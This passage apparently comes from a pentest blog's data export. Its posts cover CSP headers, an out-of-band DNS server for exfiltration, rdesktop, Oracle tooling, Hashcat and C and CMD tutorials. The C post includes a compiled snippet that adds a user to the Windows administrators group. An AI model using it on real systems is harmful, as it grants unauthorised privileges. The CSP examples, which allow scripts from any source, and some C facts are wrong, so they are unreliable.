is a security header that helps mitigate the risk of certain types of data injection attacks such as cross-site scripting. CSP allows website administrators to eliminate or mitigate cross-site scripting by defining a policy that stipulates what locations browsers should trust and allows script execution. The Content Security Policy header is sometimes referred to as a poor man's Web Application Firewall (WAF).\n\nThis header is set in HTTP response when an HTML document is requested by a user. Content Security Policy enables the website to list precisely which domains the HTML document can load scripts from. Browsers then deny requests for scripts from any other servers.\n\nThe architecture of this policy allows sites to safelist only servers containing resources they need, such as CDNs and plugins. As a result, if an attacker successfully gets a page to request a script through a cross-site scripting attack, the browser will refuse to load the script because the origin isn't on the safelist.\n\nIn addition to disallowing non-whitelisted sites, a site that implements the Content Security Policy header no longer supports inline JavaScript. This means that sites must remove code within script tags in an HTML file, JavaScript URLs, and inline event handlers and handle those tasks using script files instead.\n\nAs an ultimate form of protection, sites that want to never allow scripts to be executed can opt to globally disallow script execution. In addition to restricting the domains from which content can be loaded, the server can specify which protocols were allowed. So, for example, a server can specify that all content must be loaded using HTTPS.\n\nHowever, it should be noted that as part of a defence in depth approach, all cookies should be marked with a secure flag to ensure that they can't be transmitted over HTTP.\n\nNginx\n\n```bash\nadd_header Content-Security-Policy \"default-src 'self'; font-src *;img-src * data:; script-src *; style-src *\";\n```\n\nApache\n\n```bash\nHeader always set Content-Security-Policy \"default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;\"\n```"},{"fields":{"slug":"/install-a-dns-server-for-out-of-band-attacks"},"excerpt":"Update the Sources List apt-get update\n\n\nUpgrade the Server\n\napt-get upgrade\n\n\nInstall the Mardns server\n\napt-get install maradns\n\n\nMove into the…","frontmatter":{"date":"1st January 2022 ","title":"Install A DNS Server For Out Of Band Attacks","description":"An out of band DNS Server can be useful for a variety of use cases during a pentest or Red Team engagement. Two common purposes are for DNS Data Exfiltration and DNS Spoofing.  Maradns makes it easy for us to do this.","tags":"dns","posttype":"tutorial"},"body":"Update the Sources List\n```\napt-get update\n```\n\nUpgrade the Server\n```\napt-get upgrade\n```\n\nInstall the Mardns server\n```\napt-get install maradns\n```\n\nMove into the Maradns folder then start editing the config\n```\ncd /etc/maradns/\nnano mararc \n```\n\nMake the following edits to the `marac` config file\n```\ncsv2 = {}\ncsv2[\"evilsaint.com.\"] = \"db.evilsaint.com\"\nbind_address = \"45.32.176.126\"\n```\n\nCreate the Zone File\n```\nnano db.evilsaint.com\n```\n\nInside our file\n```\n%        NS        ns.% ~\n*.%      A         45.32.176.126 ~\n```\n\n\nRun the DNS Server\n```\nmaradns -f mararcls\n```"},{"fields":{"slug":"/toolbox-series-rdesktop"},"excerpt":"As a general rule you should check every windows machine to see if you can rdesktop to it in the enumeration phase. This will greatly aid…","frontmatter":{"date":"5th December 2021 ","title":"Toolbox  Series :- rdesktop","description":"","tags":"rdesktop","posttype":"tutorial"},"body":"As a general rule you should check every windows machine to see if you can `rdesktop` to it in the enumeration phase. This will greatly aid you in\nOperating System Identification  \n  \nBasic Syntax for rdesktop is:  \n```\nroot@kali:/# rdesktop 10.0.0.1  \n```\n\nThere are several other options we might use to further improve our experience  \n  \nThis will log us in with a username and password  of 'Administrator' and 'password'.\n```\nroot@kali:/# rdesktop -u Administrator -p password 10.0.0.1  \n```\n\nIf we change the password to a `-` it will prompt for a password on the next line before we log in  \n```\nroot@kali:/# rdesktop -u Administrator -p- 10.0.0.1  \n```\n\nAdding `-f` to our syntax will open up the RDP in full screen mode.  \n```\nroot@kali:/# rdesktop -u Administrator -f 10.0.0.1  \n```\n\nAdding a `-T` will allow us to name the desktop anything we like.  \n```\nroot@kali:/# rdesktop -u Administrator -p password -T 'my window title' 10.0.0.1  \n```\n\nIf we dont wish to go full screen we can use the `-g` to adjust the windows geometry\n```\nroot@kali:/# rdesktop -u Administrator -p password -T 'my window title' -g 90% 10.0.0.1  \n```\n\nImportant to note, we should never put the username in quotes unless it has spaces in it and if we use the RDP title option we put it in single quotes."},{"fields":{"slug":"/installing-oracle-tools-for-pentesting"},"excerpt":"ODAT Can install from Apt repository's\n\napt-get install odat \n\n\nOr we can install the latest version off of Github\n\nInstall the following…","frontmatter":{"date":"6th October 2021 ","title":"Installing Oracle Tools For Pentesting","description":"Oracle Database penetration testing can often be an area where young testers, find themselves underprepared. Oracle Database technology spans back over several decades and some of the penetration testing tools used have funky dependencies, and often need specific configuration steps.","tags":"database, odat, oracle","posttype":"tutorial"},"body":"# Oracle Tool Setup\n\n## ODAT\n\nCan install from Apt repository's\n\n```\napt-get install odat \n```\n\nOr we can install the latest version off of Github\n\nInstall the following dependencies \n\n```\nsudo apt-get install libaio1 python3-dev alien python3-pip\n```\n\nDownload ODAT (https://github.com/quentinhardy/odat)\n\n```\ngit clone https://github.com/quentinhardy/odat.git\n```\n\nInstall dependency\n\n```\npip3 install cx_Oracle --upgrade\n```\n\nTest if all is good:\n\n```\npython3 -c 'import cx_Oracle'\n```\n\n> This command should just return without errors.\n> \n\nInstall some python libraries:\n\n```\nsudo apt-get install python3-scapy\nsudo pip3 install colorlog termcolor pycrypto passlib python-libnmap\nsudo pip3 install argcomplete\nsudo activate-global-python-argcomplete3\n```\n\nDownload and install the **development** version of pyinstaller ([http://www.pyinstaller.org/](http://www.pyinstaller.org/)) for python 3.\n\n```\npython setup.py install\n\n```\n\nor install through pip:\n\n```\npip3 install pyinstaller\n\n```\n\nRun ODAT:\n\n```\npython3 odat.py -h\n```\n\n## SQLPlus\n\nInstall the Oracle Client Libraries for Kali Linux from the following URL\n\n[https://www.oracle.com/database/technologies/instant-client/downloads.html](https://www.oracle.com/database/technologies/instant-client/downloads.html)\n\nAt the time of writing the URL for my version of Kali was found on this page\n\n[https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html](https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html)\n\nBase package\n\n```\ncd /tmp\nwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-basic-linux.x64-21.3.0.0.0.zip\nsudo mkdir /opt/oracle\nsudo unzip instantclient-basic-linux.x64-21.3.0.0.0.zip -d /opt/oracle\n```\n\nSQL Plus\n\n```\ncd /tmp\nwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-sqlplus-linux.x64-21.3.0.0.0.zip\nsudo unzip instantclient-sqlplus-linux.x64-21.3.0.0.0.zip -d /opt/oracle\n```\n\nSDK\n\n```\ncd /tmp\nwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-sdk-linux.x64-21.3.0.0.0.zip\nsudo unzip instantclient-sdk-linux.x64-21.3.0.0.0.zip -d /opt/oracle\n```\n\nFiles will look similar to\n\n```\n└─$ ls -l /opt/oracle/instantclient_21_3 \ntotal 248776\n-rwxr-xr-x 1 root root     42144 Jul 27 13:18 adrci\n-rw-r--r-- 1 root root      5780 Jul 27 13:18 BASIC_LICENSE\n-rw-r--r-- 1 root root      1634 Jul 27 13:18 BASIC_README\n-rwxr-xr-x 1 root root     59528 Jul 27 13:18 genezi\n-rw-r--r-- 1 root root       342 Jul 27 13:18 glogin.sql\nlrwxrwxrwx 1 root root        21 Sep  5 10:30 libclntshcore.so -> libclntshcore.so.21.1\nlrwxrwxrwx 1 root root        21 Sep  5 10:30 libclntshcore.so.12.1 -> libclntshcore.so.21.1\nlrwxrwxrwx 1 root root        21 Sep  5 10:30 libclntshcore.so.18.1 -> libclntshcore.so.21.1\nlrwxrwxrwx 1 root root        21 Sep  5 10:30 libclntshcore.so.19.1 -> libclntshcore.so.21.1\nlrwxrwxrwx 1 root root        21 Sep  5 10:30 libclntshcore.so.20.1 -> libclntshcore.so.21.1\n-rwxr-xr-x 1 root root   8108520 Jul 27 13:18 libclntshcore.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.10.1 -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.11.1 -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.12.1 -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.18.1 -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.19.1 -> libclntsh.so.21.1\nlrwxrwxrwx 1 root root        17 Sep  5 10:30 libclntsh.so.20.1 -> libclntsh.so.21.1\n-rwxr-xr-x 1 root root  83460712 Jul 27 13:18 libclntsh.so.21.1\n-rwxr-xr-x 1 root root   7118328 Jul 27 13:18 libnnz21.so\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.10.1 -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.11.1 -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.12.1 -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.18.1 -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.19.1 -> libocci.so.21.1\nlrwxrwxrwx 1 root root        15 Sep  5 10:30 libocci.so.20.1 -> libocci.so.21.1\n-rwxr-xr-x 1 root root   2374192 Jul 27 13:18 libocci.so.21.1\n-rwxr-xr-x 1 root root 142713392 Jul 27 13:18 libociei.so\n-r-xr-xr-x 1 root root    153584 Jul 27 13:18 libocijdbc21.so\n-rwxr-xr-x 1 root root    116104 Jul 27 13:18 liboramysql.so\n-rwxr-xr-x 1 root root   1710024 Jul 27 13:18 libsqlplusic.so\n-rwxr-xr-x 1 root root   1613888 Jul 27 13:18 libsqlplus.so\ndrwxr-xr-x 3 root root      4096 Jul 27 13:18 network\n-rw-r--r-- 1 root root   5053911 Jul 27 13:18 ojdbc8.jar\ndrwxr-xr-x 5 root root      4096 Jul 27 13:18 sdk\n-rw-r--r-- 1 root root      5780 Jul 27 13:18 SDK_LICENSE\n-rw-rw-r-- 1 root root      1628 Jul 27 13:18 SDK_README\n-rwxr-xr-x 1 root root     25104 Jul 27 13:18 sqlplus\n-rw-r--r-- 1 root root      5780 Jul 27 13:18 SQLPLUS_LICENSE\n-rw-r--r-- 1 root root      1642 Jul 27 13:18 SQLPLUS_README\n-rw-r--r-- 1 root root   1790635 Jul 27 13:18 ucp.jar\n-rwxr-xr-x 1 root root    235904 Jul 27 13:18 uidrvci\n-rw-r--r-- 1 root root     74603 Jul 27 13:18 xstreams.jar\n```\n\nMake sure that libclntsh.so is symlinked\n\n```\ncd /opt/oracle/instantclient_21_3\nls -lh libclntsh.so                                                                                                                                                   2 ⨯\nlrwxrwxrwx 1 root root 17 Sep  5 10:30 libclntsh.so -> libclntsh.so.21.1\n# ln libclntsh.so.21.1 libclntsh.so\n```\n\nConfigure Dynamic Run Timer Linker\n\n```\nsudo ldconfig\n```\n\nPut the following into `~/.bashrc`\n\n```\nexport PATH=$PATH:/opt/oracle/instantclient_21_3\nexport SQLPATH=/opt/oracle/instantclient_21_3\nexport TNS_ADMIN=/opt/oracle/instantclient_21_3\nexport LD_LIBRARY_PATH=/opt/oracle/instantclient_21_3\nexport ORACLE_HOME=/opt/oracle/instantclient_21_3\n```\n\nInsert the path for our \"instantclient\" libraries into a file in the `/etc/ld.so.conf` folder so the system knows where to load them. \n\n```\necho \"/opt/oracle/instantclient_21_3/\" >> /etc/ld.so.conf.d/99_oracle\n```\n\nRe-load the bash profle\n\n```bash\nbash\n```\n\nWe should now be able to run \n\n```\nsqlplus\n```\n\n## Oscanner\n\nIf not already installed \n\n```\nsudo apt-get install oscanner\n```\n\n## TNSCmd10g\n\nIf not already installed\n\n```\nsudo apt-get install tnscmd10g\n```\n\n## Metasploit\n\n```\ncd /tmp\nwget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.2.9.zip\nwget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.1.8.zip # Oracle 9i.\nwget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.0.6.zip # Oracle 8\nunzip ruby-oci8-2.2.9.zip\ncd ruby-oci8-ruby-oci8-2.2.9/\n```\n\nInstall dependencies for us to `make` the gem\n\n```\nsudo apt-get install libgmp-dev\n```\n\nMake and install the GEM\n\n```\nsudo make\nsudo make install\nsudo gem install ruby-oci8\n```"},{"fields":{"slug":"/hashcat-now-offers-auto-detection"},"excerpt":null,"frontmatter":{"date":"2nd October 2021 ","title":"Hashcat Now Offers Auto Detection","description":"The latest edition of Hashcat now has an auto-detect mode built-in. If you pass a hashes file to Hashcat with no additional options, it will try to detect the hash types. It is a new feature, and so you will need a recent copy of Hashcat to utilise this feature.","tags":"hashcat","posttype":"blog"},"body":"I just learnt this from a colleague at work and felt it was worth a share. Hashcat now has auto-detect functionality. Run your Hashcat binary and pass only the hash file, and Hashcat will try and work out the hash types included in the file and give you the mode you need to crack them. \n\n```\nhashcat <hash file>\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/394dc713-e2a6-40da-98fa-da8f02387e65.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nIn the above example, I am using Hashcat version 6.2.4; however, I have been informed that the auto-detect feature was added in Hashcat 6.2.2. \n\nIn the screen capture below, we can see the detected hash types in my file. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/b8ae95f9-fea9-4c82-ad56-1fafef2e84ef.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">  </figcaption></figure>\n\nThe orange text indicates that this is a best-effort detection; however, it is correct in my case. The file contains five NTLM hashes."},{"fields":{"slug":"/c-tutorial"},"excerpt":"C is a general-purpose, procedural computer programming language, developed by R&D company Bell Labs back in 1972. It's a widely used…","frontmatter":{"date":"17th September 2021 ","title":"C Tutorial","description":"","tags":"c","posttype":"tutorial"},"body":"# C\nC is a general-purpose, procedural computer programming language, developed by\nR&D company Bell Labs back in 1972. It's a widely used programming language,\nmost notably in systems programming for operating systems, compilers,\ninterpreters, libraries of other programming languages and in implementations\nof embedded system applications. For example, Linux and Windows kernel are\nwritten in C, most of GNU components and also Python, PHP, Ruby, Perl interpreters.\n\nBefore a C program can do anything, it first needs to be compiled,\ni.e. translated from C source into a binary code which can instruct the CPU.\n\nThe C language provides no built-in facilities for performing common\noperations such as input/output, memory management, string manipulation, and the others. Instead, these facilities are defined in a standard libraries, which you compile and link with your programs.\n\nInformation about standard and other libraries should be included inside the first lines of the code. The following line includes the standard input/output\nlibrary, where 'stdio.h' is the name of the library's header file.\n\n\n```c\n#include <stdio.h>\n```\n\nNow, some brief notes about the C program: it consists of functions and variables. A function contains statements that specify the computing\noperations, and variables store values used during the computation. Communication between the functions is by arguments and values returned by the functions, and through external variables.\nThe return statement defines a value to be returned from the called function to its caller.\n\nYou can name your functions however you want, with the exception of the name\n'main'. Function called 'main' is special - your program begins executing\nat the beginning of the main. This means that every program must have a main\ndefined somewhere in code.\n\n\n```c\n#include <stdio.h>\n\nint main() {\n  printf(\"Goodbye, World!\");\n  return 0;\n}\n```\nWhen we write `int main()` we are stating that our program will return and integer. The number returned by the function indicates whether the\nprogram we wrote worked correctly. A return of 0 mean our programmed returned\nsuccessfully, a number greater than 0 means it failed. Every line in C must end\nwith a semicolon, so that the compiler knows that a new line has started.\n\n\n\n## Variables\n\n\n### Types\n\nThere are only a few basic data types in C:\n\n - ``char`` - single byte, capable of holding one character in the local character set.\n\n - ``int`` - integer, typically reflecting the natural size of integers on the host machine.\n\n - ``float`` - single-precision floating point.\n\n - ``double`` - double-precision floating point\n\nIn addition, there are a number of qualifiers that can be applied to these\nbasic types. ```short``` and ```long``` apply to integers:\n\n```c\nshort int var_one;\nlong int var_two;\n```\n\nNote: 'int' can be omitted in these declarations.\n\n\n### Defining variables\n\nAll variables must be declared before use, although certain declarations can\nbe made implicitly by content. A declaration specifies a type, and contains a\nlist of one or more variables of that type, as in\n\n```c\nint lower, upper, step;\nchar c, line[1000];\n```\n\nFor whole numbers, int type is used, which an integer in the size of a \"word\"\nthe default number size of the machine which your program is compiled on. On\nmost computers today, it is a 32-bit number, which means the number can range\nfrom -2,147,483,648 to 2,147,483,647.\n\n```c\nint a = 0,b = 1,c = 2,d = 3, e = 4;\na = b - c + d * e;\nprintf(\"%d\", a); /* will print 1-2+3*4 = 11 */\n```\n\n\nDeclaring Strings\n```c\nchar name[] = \"John Smith\";\n/* is the same as */\nchar name[11] = \"John Smith\";\n```\n\nThe reason that we need to add one, although the string John Smith is exactly 10 characters long, is for the string termination, a special character (equal to 0) which indicates the end of the string. The end of the string is marked because the program does not know the length of the string - only the compiler knows it according to the code.\n\nUsing a pointer to define a simple string. This method creates a string which can only be used for reading\n```c\nchar * name = \"John Smith\";\n```\n\nString formatting with `printf`\n```c\nchar * name = \"John Smith\";\nint age = 27;\n\n/* prints out 'John Smith is 27 years old.' */\nprintf(\"%s is %d years old.\\n\", name, age)\n```\n\nString Length - The function `strlen` returns the length of the string which has to be passed as an argument:\n```c\nchar * name = \"Nikhil\";\nprintf(\"%d\\n\",strlen(name));\n```\n\n\n## Operators\n\n### Unary operators\n\nUnary operators are placed as prefix relative to operands and operate on\nsingle a operand. E.g. incrementing a 'var' variable with '++' operator.:\n```c\n++var;\n```\n\n#### Increment and decrement operators\n\n** ++ ** - Increment operatror-\n** -- ** - Decremet operator.\n\n#### Address and indirection operators\n\n** & ** - Address Operator. Yields the address of the operand.\n** * ** - Indirection operator. Yields the object or function to which its operand points, also known as pointer.\n** + ** - Unary Plus Operator. Yields the value of the operand, which must be of arithmetic type.\n** - ** - Unary Minus Operator. Yields the negative value of the operand, which must be of arithmetic type.\n** ~ ** - One's Complement Operator. Yields the complement value of the operand, which must be of integral type.\n** ! ** - Logical Negation Operator. Yields 1 if the value of its operand compares equal to 0, and 0 otherwise.  \n** sizeof ** -Sizeof Operator. Yields the number of bytes required to store an object of the type of its operand.\n\n### Multiplicative operators\n** * ** - Multiplication Operator. Yields the multiple of two operands, both of whcih must be of arithmetic type.\n** / ** - Division Operator. Yields the divison of first by the second operand, both of which must be of arithmetic type.\n** % ** Remainder Operator. Yields the remainder of divison of first operand by the second, both of which must be of integral type.\n\n### Additive Operators\nIf the operands have arithmetic type, the usual arithmetic conversions are performed.\n\n** + ** - Yields the sum of operands.\n** - ** - Yields the value of the first operand subtracted by the value of second.\n\n### Shift Operators\n\n### Equality Operators\n\n### Relational operators\n\n### Bitwise AND Operator\n\n### Bitwise Exclusive OR Operator\n\n### Logical AND Operator\n\n### Logical OR Operator\n\n### Conditional Operator\n\n### Assignment Operators\n\n### Comma Operator\n\n\n## Arrays\nAn 'array' type variable is a contiguously allocated nonempty set of objects,\nalos called elements, with a particular member object type. Each object can\nbe accessed via subscript, also called index, number. In C, index number starts from 0 since it\nreferences a memory location offset by ```n``` objects away from the first element.\n\nArrays are defined in a very straightforward syntax:\n\n```c\nint numbers[10];\n```\n\nThe example above defines an array containing 11 objects, indexed from 0 to\n10, of type 'int'.\n\n\nWe can assign and retrive as follows:\n\n```c\n//int numbers[10];\n/* populate the array */\nnumbers[0] = 10;\nnumbers[1] = 20;\nnumbers[2] = 30;\nnumbers[3] = 40;\nnumbers[4] = 50;\nnumbers[5] = 60;\nnumbers[6] = 70;\n\n/* print the 7th number from the array, which has an index of 6 */\nprintf(\"The 7th number in the array is %d\", numbers[6]);\n```\n\nHere is the general form of a multidimensional array declaration:\n```c\ntype arrayName [x][y];\n```\n\nInitialise a two dimensional array\n```c\nint a[3][4] = {\n   {0, 1, 2, 3} ,   /*  initializers for row indexed by 0 */\n   {4, 5, 6, 7} ,   /*  initializers for row indexed by 1 */\n   {8, 9, 10, 11}   /*  initializers for row indexed by 2 */\n};\n```\n\nThe inside braces, which indicates the wanted row, are optional. The following initialization is the same to the previous example.\n```c\nint a[3][4] = {0,1,2,3,4,5,6,7,8,9,10,11};\n```\n\nLet's access a two-dimensional element\n```c\nint val = a[2][3];\n```\n\nExample program using multidimensional arrays\n```c\n     #include <stdio.h>\n\n     int main() {\n          int grades[2][5];\n          float average;\n          int i;\n          int j;\n\n          grades[0][0] = 80;\n          grades[0][1] = 70;\n          grades[0][2] = 65;\n          grades[0][3] = 89;\n          grades[0][4] = 90;\n\n          grades[1][0] = 85;\n          grades[1][1] = 80;\n          grades[1][2] = 80;\n          grades[1][3] = 82;\n          grades[1][4] = 87;\n\n          for (i = 0; i < 2; i++) {\n               average = 0;\n\n               for (j = 0; j < 5; j++) {\n                    average += grades[i][j];\n               }\n\n               average /= 5.0;\n               printf(\"The average marks obtained in subject %d is: %.2f\\n\", i, average);\n          }\n\n          return 0;\n     }\n```\n\n## Selection (Conditional) statements\nA selection statement is a flow of control mechanism which selects among a set of substatements depending on the value of a controlling expression. The first substatement whose conditional expression, which must be arithmetic or pointer type, is evaluated to be unequal to 0 is executed.\n\nSelection statement can be in three forms:\n```\n//pseudocode\nif (expression) statement\nif (expression) statement else statement\nswitch (expression) statement\n```\n\nIn the follwoing example:\n```c\nif ( var < 4 ) {\n   printf( \"var is less than 4.\" );\n} else {\n   printf( \"var is larger than 4.\" );\n}\n```\n\n\n## Loops\n\n### For Loops\n\n\nUsing a for loop to iterate over a block 10 times.\n```c\nint i;\nfor (i = 0; i < 10; i++) {\n    printf(\"%d\\n\", i);\n}\n```\n\nFor loops can iterate over arrays\n```c\nint array[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\nint sum = 0;\nint i;\n\nfor (i = 0; i < 10; i++) {\n    sum += array[i];\n}\n\n/* sum now contains a[0] + a[1] + ... + a[9] */\nprintf(\"Sum of the array is %d\\n\", sum);\n```\n\n### While Loops\n\nWhile loops are like for loops but have less functionality. A while loop continues executing the while block as long as the condition in the while holds true.\n```c\nint n = 0;\nwhile (n < 10) {\n    n++;\n}\n```\n\nWhile loops can also execute infinitely if a condition is given which always evaluates as true (non-zero):\n```c\nwhile (1) {\n   /* do something */\n}\n```\n\nNOTE: the `break` and `continue` directives.\n\nThe break directive halts a loop after ten loops, even though the while loop never finishes:\n```c\nint n = 0;\nwhile (1) {\n    n++;\n    if (n == 10) {\n        break;\n    }\n}\n```\n\nIn the following code, the continue directive causes the printf command to be skipped, so that only even numbers are printed out:\n```c\nint n = 0;\nwhile (n < 10) {\n    n++;\n\n    /* check that n is odd */\n    if (n % 2 == 1) {\n        /* go back to the start of the while block */\n        continue;\n    }\n\n    /* we reach this code only if n is even */\n    printf(\"The number %d is even.\\n\", n);\n}\n```\n\n## Functions\n\n* Functions receive either a fixed or variable amount of arguments.\n* Functions can only return one value, or return no value.\n\nExample function definition\n```c\nint foo(int bar) {\n    /* do something */\n    return bar * 2;\n}\n\nint main() {\n    foo(1);\n}\n```\n\nIn C, functions must be first defined before they are used in the code. They can be either declared first and then implemented later on using a header file or in the beginning of the C file, or they can be implemented in the order they are used (less preferable).\n\nThe correct way to use functions is as follows:\n```c\n/* function declaration */\nint foo(int bar);\n\nint main() {\n    /* calling foo from main */\n    printf(\"The value of foo is %d\", foo(1));\n}\n\nint foo(int bar) {\n    return bar + 1;\n}\n```\n\nWe can also create functions that do not return a value by using the keyword void:\n```c\nvoid moo() {\n    /* do something and don't return a value */\n}\n\nint main() {\n    moo();\n}\n```\n\n## Static Variables, Refercences and Pointers\n\n**What is a static variable?**\n\nBy default, variables are local to the scope in which they are defined. Variables can be declared as static to increase their scope up to file containing them. As a result, these variables can be accessed anywhere inside a file.\n\n**References And Pointers**\n\nA pointer is essentially a simple integer variable which holds a memory address that points to a value, instead of holding the actual value itself.\n\nDereferencing is the act of referring to where the pointer points at.\n```c\n#include <stdio.h>\n\nint main() {\n    /* define a local variable a */\n    int a = 1;\n\n    /* define a pointer variable, and point it to a using the & operator */\n    int * pointer_to_a = &a;\n\n    printf(\"The value a is %d\\n\", a);                          /* 1 */\n    printf(\"The value of a is also %d\\n\", *pointer_to_a);      /* 1 */\n    printf(\"The address of a is %d\\n\", pointer_to_a);          /*  713939084*/\n    printf(\"The address of a is %d\\n\", &a);                    /*  713939084*/\n\n    return 0;\n}\n```\n\n## Structures\n\nC structures are special, large variables which contain several named variables inside. Structures are the basic foundation for objects and classes in C. Structures are used for:\n* Serialization of data\n* Passing multiple arguments in and out of functions through a single argument\n* Data structures such as linked lists, binary trees, and more\n\nDefining a structure\n```c\nstruct point {\n    int x;\n    int y;\n}\n```\n\nDeclaring a struct upfront and then building it on the fly\n```c\nstruct point p;\np.x = 10;\np.y = 5;\ndraw(p);\n```\n\nExample of struct and typedef\n```c\ntypedef struct {\n    char * brand;\n    int model;\n} vehicle;\n\nvehicle mycar;\nmycar.brand = \"Ford\";\nmycar.model = 2007;\n```\n\n## Function arguments by reference\n\nFunction arguments are passed by value, which means they are copied in and out of functions. But what if we copied pointers to values instead of the values themselves? This will enable us to give functions control over variables and structures of the parent functions, and not just a copy of them.\n\nBecause we pass in the memory location and reference it inside via a pointer, this example allows us to increment `n` outside of the function\n```c\nvoid addone(int * n) {\n    (*n)++;\n}\n\nint n;\nprintf(\"Before: %d\\n\", n);\naddone(&n);\nprintf(\"After: %d\\n\", n);\n```\n\n## Compiling\n\nCompile C code.\n```\ngcc -o output.c input.c\n```\n\nCross compile C code, compile 32 bit binary on 64 bit Linux.\n```\ngcc -m32 -o output.c input.c\n```\n\nCompile a binary for Windows on Linux\n```\ni686-w64-mingw32-gcc -o program.exe mycode.c\n```\n\n## Useful Snippets\n\nAn add windows user program\n\ncat useradd.c\n```c\n/* system, NULL, EXIT_FAILURE */\n\n#include <stdlib.h>\n\nint main ()\n{\nint i;\ni=system (\"net localgroup administrators myuser /add\");\nreturn 0;\n}\n```\n\nNow we compile this while on Linux\n```\ni686-w64-mingw32-gcc -o adduser.exe useradd.c\n```"},{"fields":{"slug":"/cmd-tutorial"},"excerpt":"title: CMD weight: 10 For Loops\n\nOverview\n\nFOR Loop through a set of files in one folder\n\nFOR /R\tLoop through files (recurse subfolders)\nFOR…","frontmatter":{"date":"17th September 2021 ","title":"CMD Tutorial","description":"","tags":"cmd, windows","posttype":"tutorial"},"body":"---\ntitle: CMD \nweight: 10\n---\n# CMD\n\n## For Loops\n\nOverview\n\nFOR\tLoop through a set of files in one folder\n```\nFOR /R\tLoop through files (recurse subfolders)\nFOR /D\tLoop through several folders\nFOR /L\tLoop through a range of numbers\nFOR /F\tLoop through items in a text file\nFOR /F\tLoop through the output of a command\n```\n\nA loop with no modifier options will run a specified command for each file in a set of files (won't act on directories).\n```\nFOR %variable IN (set) DO command [command-parameters]\n```\n\n> To use the FOR command in a batch program, specify `%%variable` instead of `%variable`. Variable names are case sensitive, so `%i` is different from `%I`\n\n### For Loop Modifiers\n\nUsing the /D modifier modifies are loop so that it only iterates and acts over files\n```\nFOR /D %variable IN (set) DO command [command-parameters]\n```\n\nUsing the /R modifier we are able to walk recursively listing files. We can either add a drive and path after the /R option and we will start recursively from that point. If we miss out the drive and path then we start recursive from the working directory.\n```\nFOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]\n```\n\nUsing the /L modifier we can loop over sequences of numbers from start to end, and even indicate what amount to step up by\n```\nFOR /L %variable IN (start,step,end) DO command [command-parameters]\n```\n> The set is a sequence of numbers from start to end, by step amount. So (1,1,5) would generate the sequence 1 2 3 4 5 and (5,-1,1) would generate the sequence (5 4 3 2 1)\n\n#### The /F modifier\n\nThe /F modifier can be used to construct some very powerful loops.\n\nEach file is opened, read and processed before going on to the next file in file-set. Processing consists of reading in the file, breaking it up into individual lines of text and then parsing each line into zero or more tokens.\n```\nFOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters]\nFOR /F [\"options\"] %variable IN ('string') DO command [command-parameters]\nFOR /F [\"options\"] %variable IN (`command`) DO command [command-parameters]\n```\n\n| Option | Description                                                         |\n| ------ | ------------------------------------------------------------------- |\n| eol=c  | specifies an end of line comment character (just one)               |\n| skip=n | specifies the number of lines to skip at the beginning of the file. |\n| delims=xxx  | \tspecifies a delimiter set.  This replaces the default delimiter set of space and tab. |\n| tokens=x,y,m-n |\tspecifies which tokens from each line are to be passed to the for body for each iteration. This will cause additional variable names to be allocated. The m-n form is a range, specifying the mth through the nth tokens. If the last character in the tokens= string is an asterisk, then an additional variable is allocated and receives the remaining text on the line after the last token parsed. |\n| usebackq   |    \tspecifies that the new semantics are in force, where a back quoted string is executed as a command and a single quoted string is a literal string command and allows the use of double quotes to quote file names in filenameset. |\n\nExamples of the different loops\n\nLoop through all files\n```\nC:\\ for %i in (C:\\Windows\\System32\\*) do @echo name: %i attrib: %~ai\n```\nLoop through all directories (only difference is addition of /D)\n```\nC:\\ for /D %i in (C:\\Windows\\System32\\*) do @echo name: %i attrib: %~ai\n```\nLoop through all files recursively\n```\nfor /R C:\\Windows %i in (*) do @echo name: %i attrib: %~ai\n```\nLoop through all folders recursively\n```\nfor /R C:\\Windows /D %i in (*) do @echo name: %i attrib: %~ai\n```\nA loop around a sequence of numbers between 2-254 piped to ping to make a ping sweeper\n```\nfor /L %i in (2,1,254) do ping -n 2 127.0.0.%i\n```\n\nBatch File Loops\n\nHere is how we would write FOR loops inside a batch file with the %%.\n\nLoop through text files and echo file name\n```\nfor %%F IN (*.txt) DO @echo %%F\n```\n\nLoop through text files and output the file contents\n```\nfor %%F IN (*.txt) DO @echo %%F\n```"},{"fields":{"slug":"/python-tutorial"},"excerpt":"title: Python weight: 10 sha-bang\n\n#!/usr/bin/python\n\n\nMore portable sha-bang\n\n#!/usr/bin/env python\n\n\nSMTP Script for detecting 